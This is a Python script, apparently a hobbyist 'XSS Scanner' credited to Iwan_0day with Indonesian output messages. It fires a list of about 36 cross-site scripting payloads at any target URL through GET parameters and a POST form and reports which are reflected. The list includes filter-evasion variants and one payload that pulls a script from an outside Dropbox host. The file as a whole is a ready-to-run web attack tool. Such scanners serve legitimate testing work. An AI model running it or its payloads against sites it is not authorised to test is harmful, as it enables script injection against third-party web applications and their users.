import argparse
import sys
import requests
from urllib.parse import quote
from colorama import Fore, Style,init

init(autoreset=True)

def banner():
    yellow = "\033[1;33m"
    reset = "\033[0m"
    print(yellow + r""" 
╔═════════════════════════════════════════════════════════════════════╗
║▒██   ██▒  ██████   ██████      ██████  ▄████▄   ▄▄▄       ███▄    █ ║
║▒▒ █ █ ▒░▒██    ▒ ▒██    ▒    ▒██    ▒ ▒██▀ ▀█  ▒████▄     ██ ▀█   █ ║
║░░  █   ░░ ▓██▄   ░ ▓██▄      ░ ▓██▄   ▒▓█    ▄ ▒██  ▀█▄  ▓██  ▀█ ██▒║
║ ░ █ █ ▒   ▒   ██▒  ▒   ██▒     ▒   ██▒▒▓▓▄ ▄██▒░██▄▄▄▄██ ▓██▒  ▐▌██▒║
║▒██▒ ▒██▒▒██████▒▒▒██████▒▒   ▒██████▒▒▒ ▓███▀ ░ ▓█   ▓██▒▒██░   ▓██░║
║▒▒ ░ ░▓ ░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░   ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ ║
║░░   ░▒ ░░ ░▒  ░ ░░ ░▒  ░ ░   ░ ░▒  ░ ░  ░  ▒     ▒   ▒▒ ░░ ░░   ░ ▒░║
║ ░    ░  ░  ░  ░  ░  ░  ░     ░  ░  ░  ░          ░   ▒      ░   ░ ░ ║
║ ░    ░        ░        ░           ░  ░ ░            ░  ░         ░ ║
║                                       ░                             ║
╚═════════════════════════════════════════════════════════════════════╝    
                    [iwan-0day | XSS Scanner v.1.0]                            
                                                                
    """)


def check_connection(url):
    try:
        response = requests.get(url,timeout=5)
        if response.status_code == 200:
            print(Fore.GREEN + "[+] Koneksi Berhasil ! Target Online.")
            return True
        else:
            print(Fore.RED + f"[-] Target Merespon dengan status:{response.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"[!] Error Koneksi:{e}")
        return False

def scan_xss(url):
    payloads = [
        r'''<script>alert(123);</script>''', r''''"><sVg/onload=alert(1)>''',
        r'''<script>alert("hellox worldss");</script>''', r'''"><script>alert(XSS)</script>''',
        r'''<script>alert(XSS);</script>''', r'''"><script>alert(XSS)</script>''',
        r'''<script>alert(/XSS)</script>''', r'''<script>alert(/XSS/)</script>''',
        r'''</script><script>alert(1)</script>''', r'''; alert(1);''', r''')alert(1);//''',
        r'''"><ScRiPt>alert(1)</sCriPt>''', r'''<IMG SRC=jAVasCrIPt:alert(XSS)>''',
        r'''<IMG SRC=javascript:alert(XSS);>''', r'''<img src=xss onerror=alert(1)>''',
        r'''<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>''',
        r'''<svg><style>{font-family&colon;\'<iframe/onload=confirm(1)>\'''',
        r'''<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"''',
        r'''<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}''',
        r'''<img/src=`%00` onerror=this.onerror=confirm(1)''',
        r'''<form><isindex formaction="javascript&colon;confirm(1)"''',
        r'''<img src=`%00`&NewLine; onerror=alert(1)&NewLine;''',
        r'''<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>''',
        r'''<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT>''',
        r'''<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">''',
        r'''&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00''',
        r'''<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">''',
        r'''<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>''',
        r'''<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script>''',
        r'''<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">''',
        r'''<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>''',
        r'''<form><a href="javascript:\u0061lert&#x28;1&#x29;">X''',
        r'''<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>''',
        r'''<video src=1 onerror=alert(1)>''', r'''<audio src=1 onerror=alert(1)>'''
    ]

    clean_url = url.split('?')[0]
    test_params = ['searchFor', 'test'] 
    headers = {'User-Agent': 'Mozilla/5.0'}

    for payload in payloads:
        for p in test_params:
            clickable_url = f"{clean_url}?{p}={quote(payload)}"
            try:
                res_get = requests.get(clean_url, params={p: payload}, timeout=5, headers=headers)
                if payload.lower() in res_get.text.lower():
                    print(Fore.GREEN + f"[VULN-GET] {p} -> {clickable_url}")
                else:
                    print(Fore.RED + f"[NOT VULN-GET] {p} -> {clickable_url}...")
            except:
                pass
        try:
            data_post = {'searchFor': payload, 'update': 'Search'}
            res_post = requests.post(clean_url, data=data_post, timeout=5, headers=headers)
            
            if payload.lower() in res_post.text.lower():
                print(Fore.GREEN + f"[VULN-POST] searchFor -> {payload}...")
        except:
            pass


def main ():
    banner()
    parser = argparse.ArgumentParser(description="Simple XSS Scanner By Iwan_0day")
    parser.add_argument("-u","--url", help="Target URL(contoh:https://example.com/serch?q=test)")

    if len(sys.argv) == 1:

        parser.print_help(sys.stderr)
        sys.exit(1)
    args = parser.parse_args()
    target_url = args.url

    if target_url:
        print("="*80 ) 
        print(Fore.CYAN + f"[*] Memulai Scaning Pada : {target_url}" )

    if check_connection(target_url):
        if "?" in target_url:
            print(Fore.YELLOW + f"[*] Parameter Ditemukan, siap testing payload...")
            print("="*80 ) 
            scan_xss(target_url)
        else:
            print(Fore.RED + f"[!] Tidak ada parameter ditemukan(contoh : ?q=test).")
    

if __name__ == "__main__":
    main()
